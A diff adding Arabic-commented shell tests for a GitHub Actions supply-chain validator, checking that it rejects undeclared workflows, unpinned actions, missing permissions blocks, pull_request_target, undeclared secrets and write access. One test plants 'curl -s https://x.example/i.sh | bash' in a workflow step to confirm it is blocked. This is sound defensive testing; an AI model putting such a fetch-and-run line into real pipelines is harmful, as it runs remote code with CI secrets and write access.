@@ -1230,6 +1230,67 @@ cim_mut_door4() {
 }
 t "البابُ 4 (لا حارسَ يتيماً) يكشف فعلاً" pass cim_mut_door4
 
+printf '\n\033[1m[ط2] سلسلةُ توريدِ سيرِ العملِ — كلُّ سيرٍ مُعلَنٌ ومُثبَّتٌ (M0-31)\033[0m\n'
+# العطبُ الذي أوجبَ هذه الحالاتِ مقيسٌ: حرّاسُ CI يقرؤون `ci.yml` و`.gitlab-ci.yml`
+# **بالاسمِ**، فسيرُ عملٍ ثالثٌ أُضيفَ إلى `main` (`2d604c4`) يجري على كلِّ طلبِ دمجٍ
+# بسرِّ المستودعِ وبصلاحيّةِ كتابةٍ **ولم يَرَه حارسٌ واحدٌ**. فهذه الحالاتُ تُثبِتُ
+# أنّ الحارسَ الجديدَ يرى الثلاثةَ ويُسقِطُ كلَّ بابٍ من أبوابِه وحدَه.
+WFG="$T/scripts/checks/validate-workflow-supply-chain.sh"
+
+_wf_root() { # نسخةُ جذرٍ معزولةٌ: لا تُلمَسُ شجرةُ الحزمةِ ولا المستودعُ الأصليُّ
+  local R; R="$(mktemp -d)"; mkdir -p "$R/.github/workflows"
+  cp "$T"/.github/workflows/*.yml "$R/.github/workflows/"; printf '%s' "$R"
+}
+_wf_sed()    { local R; R="$(_wf_root)"; sed -i "$1" "$R/.github/workflows/$2"; bash "$WFG" "$R" >/dev/null 2>&1; }
+_wf_append() { local R; R="$(_wf_root)"; printf '%s' "$2" >> "$R/.github/workflows/$1"; bash "$WFG" "$R" >/dev/null 2>&1; }
+_wf_rm()     { local R; R="$(_wf_root)"; rm -f "$R/.github/workflows/$1"; bash "$WFG" "$R" >/dev/null 2>&1; }
+_wf_new()    { local R; R="$(_wf_root)"; printf 'name: sneak\non: [push]\npermissions:\n  contents: read\njobs:\n  a:\n    runs-on: ubuntu-latest\n    steps:\n      - run: "true"\n' > "$R/.github/workflows/$1"; bash "$WFG" "$R" >/dev/null 2>&1; }
+
+# (1) الحالةُ الموجبةُ: الشجرةُ كما هي تمرُّ — فلو أخفقت لكانَ كلُّ رفضٍ بعدَها بلا معنى.
+t "الحارسُ يمرُّ على شجرةِ المستودعِ" pass bash "$WFG" "$T"
+
+# (2) المنعُ أصلٌ: سيرُ عملٍ سليمُ الصياغةِ تماماً، وذنبُه الوحيدُ أنّه غيرُ مُعلَنٍ.
+t "سيرُ عملٍ غيرُ مُعلَنٍ يُرفَض" fail _wf_new sneak.yml
+# (3) وإعلانٌ بلا ملفٍّ رفضٌ أيضاً — لا جردَ يُجمِّلُه سطرٌ ميتٌ.
+t "إعلانٌ يتيمٌ بلا ملفٍّ يُرفَض" fail _wf_rm roadmap.yml
+
+# (4) جوهرُ العطبِ: عودةُ الفعلِ الخارجيِّ إلى وسمٍ متحرِّكٍ.
+t "فعلُ طرفٍ ثالثٍ بوسمٍ متحرِّكٍ يُرفَض" fail \
+  _wf_sed 's|@ecc2434351ef76b0084b788a3d61ec7d3acf44f9 # v2|@v2|' gemini-review.yml
+# (5) وبصمةٌ بلا وسمٍ مقروءٍ تُرفَض: أربعونَ خانةً لا يُراجِعُها بشرٌ بلا اسمٍ.
+t "بصمةٌ بلا وسمٍ مقروءٍ تُرفَض" fail _wf_sed 's| # v2||' gemini-review.yml
+# (6) ومرجعُ فرعٍ في فعلِ طرفٍ أوّلٍ أسوأُ من الوسمِ — يتغيَّرُ بكلِّ دفعةٍ.
+t "فعلُ طرفٍ أوّلٍ بمرجعِ فرعٍ يُرفَض" fail _wf_sed 's|actions/checkout@v4|actions/checkout@main|' roadmap.yml
+# (7) وصورةُ حاوٍ بوسمٍ لا ببصمةٍ.
+t "صورةُ حاوٍ بلا بصمةٍ تُرفَض" fail \
+  _wf_sed 's|      - uses: actions/checkout@v4|      - uses: docker://alpine:3.20|' roadmap.yml
+
+# (8) و(9) `pull_request_target` بالصياغتَينِ. والثانيةُ ليست ترفاً:
+# أوّلُ صياغةِ الحارسِ أَلزمت بدايةَ السطرِ فمرَّت `on: [pull_request_target]` بـrc=0
+# — عيبٌ مقيسٌ في الحارسِ نفسِه كشفته هذه الحالةُ قبلَ الدفعِ.
+t "pull_request_target مضمَّناً في قائمةٍ يُرفَض" fail \
+  _wf_sed 's|^on: \[pull_request\]|on: [pull_request_target]|' gemini-review.yml
+t "pull_request_target بصياغةِ كتلةٍ يُرفَض" fail _wf_append roadmap.yml '
+on:
+  pull_request_target:
+'
+# (10) غيابُ كتلةِ الصلاحيّةِ = وراثةُ الافتراضيِّ للمستودعِ صامتاً.
+t "سيرٌ بلا كتلةِ permissions يُرفَض" fail _wf_sed '0,/^permissions:/{/^permissions:/d}' roadmap.yml
+# (11) شفرةٌ تُجلَبُ من الشبكةِ وتُنفَّذُ بصلاحيّةِ الوظيفةِ.
+t "جلبٌ من الشبكةِ يُنفَّذُ مباشرةً يُرفَض" fail \
+  _wf_sed 's|        run: node scripts/check-roadmap.mjs|        run: curl -s https://x.example/i.sh \| bash|' roadmap.yml
+
+# (12) و(13) تسلُّلُ الصلاحيّةِ في الاتّجاهَينِ: سرٌّ في سيرٍ مُعلَنٍ بلا أسرارٍ،
+# وكتابةٌ في سيرٍ مُعلَنٍ بلا كتابةٍ. فالجردُ ليس وصفاً بل قياساً يُطابَق.
+t "سرٌّ غيرُ مُعلَنٍ في الجردِ يُرفَض" fail \
+  _wf_sed 's|          BASE_SHA: ${{ github.event.before }}|          K: ${{ secrets.GEMINI_API_KEY }}|' roadmap.yml
+t "صلاحيّةُ كتابةٍ غيرُ مُعلَنةٍ تُرفَض" fail _wf_sed 's|^  contents: read|  contents: write|' ci.yml
+
+# (14) والتعليلُ المكتوبُ يمرُّ: منعُ **ذكرِ** النمطِ يمحو الدليلَ الذي يمنعُ عودتَه.
+t "ذكرُ النمطِ في تعليقٍ يمرُّ" pass _wf_append roadmap.yml '
+# تعليلٌ: pull_request_target ممنوعٌ هنا، ولا يُمرَّرُ سرٌّ إلى هذا السيرِ.
+'
+
 printf '\n\033[1m[ي] تدقيقُ الاعتمادياتِ والثغرات (M0-06)\033[0m\n'
 # الحارسُ يسأل مُسجَّلَ npm عبرَ الشبكةِ، ويقرأ `package.json` و`SECURITY_RULES.md`.
 # فتُبنى له **جذورٌ صناعيّةٌ** في /tmp، ويُغذَّى **مخارجَ تدقيقٍ مُصطنَعةً** عبرَ
